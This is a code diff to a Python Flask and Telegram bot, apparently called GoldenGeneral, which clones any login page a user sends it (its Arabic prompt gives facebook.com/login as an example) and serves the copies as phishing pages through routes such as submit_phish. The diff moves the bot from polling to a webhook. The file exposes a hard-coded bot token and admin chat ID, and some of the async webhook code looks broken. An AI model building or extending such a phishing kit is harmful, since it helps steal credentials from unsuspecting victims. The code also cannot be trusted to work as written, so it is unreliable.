@@ -1,8 +1,7 @@
-import os, re, uuid, logging, tempfile, asyncio
+import os, re, uuid, logging, tempfile
 import requests
 from bs4 import BeautifulSoup
 from flask import Flask, request, abort, redirect
-from threading import Thread
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
@@ -10,9 +9,12 @@ from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, fil
 BOT_TOKEN = "8511885419:AAHi0yNNaA1IVDtulFZBokSb9l_KbXaQe38"
 ADMIN_CHAT = "6829017835"
 RENDER_URL = "https://goldengeneral.onrender.com"
+PORT = int(os.environ.get("PORT", 10000))
 # ====================================
 
 TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
+WEBHOOK_PATH = f"/webhook/{BOT_TOKEN}"
+WEBHOOK_URL = f"{RENDER_URL}{WEBHOOK_PATH}"
 
 app = Flask(__name__)
 phish_pages = {}
@@ -38,13 +40,12 @@ def submit_phish(page_id):
 
 @app.route('/')
 def health():
-    return "GoldenGeneral Phish only"
+    return "GoldenGeneral is live"
 
-# --- معالج أمر /start ---
+# ========== بوت تيليجرام (Webhook) ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("🥇 أرسل رابط أي صفحة تسجيل دخول لاستنساخها فورًا.\nمثال: https://facebook.com/login")
 
-# --- معالج الروابط: يستقبل أي رابط ويفعله ---
 async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     url = update.message.text.strip()
     if not url.startswith("http"):
@@ -62,18 +63,34 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await msg.edit_text(f"❌ فشل: {e}")
 
-# --- تشغيل البوت ---
-def start_bot():
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+def setup_bot():
+    """تجهيز البوت وربطه بـ Webhook"""
     app_bot = ApplicationBuilder().token(BOT_TOKEN).build()
     app_bot.add_handler(CommandHandler("start", start))
-    # أي نص آخر (غير أوامر) يعامل كرابط
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
-    app_bot.run_polling(close_loop=False)
-    loop.close()
+
+    # تعيين webhook
+    requests.post(f"{TELEGRAM_URL}/setWebhook", json={"url": WEBHOOK_URL})
+    logging.info(f"Webhook set to {WEBHOOK_URL}")
+
+    # استقبال التحديثات من تيليجرام عبر endpoint
+    @app.route(WEBHOOK_PATH, methods=['POST'])
+    def webhook():
+        update = Update.de_json(request.get_json(force=True), app_bot.bot)
+        app_bot.update_queue.put(update)
+        return "OK"
+
+    # تشغيل معالجة التحديثات بشكل غير متزامن داخل Flask
+    @app.before_first_request
+    async def start_updater():
+        await app_bot.initialize()
+        await app_bot.start()
+        # تشغيل عملية استهلاك التحديثات
+        async def consume():
+            async for update in app_bot.update_queue:
+                await app_bot.process_update(update)
+        app_bot.create_task(consume())
 
 if __name__ == '__main__':
-    Thread(target=start_bot, daemon=True).start()
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+    setup_bot()
+    app.run(host='0.0.0.0', port=PORT)
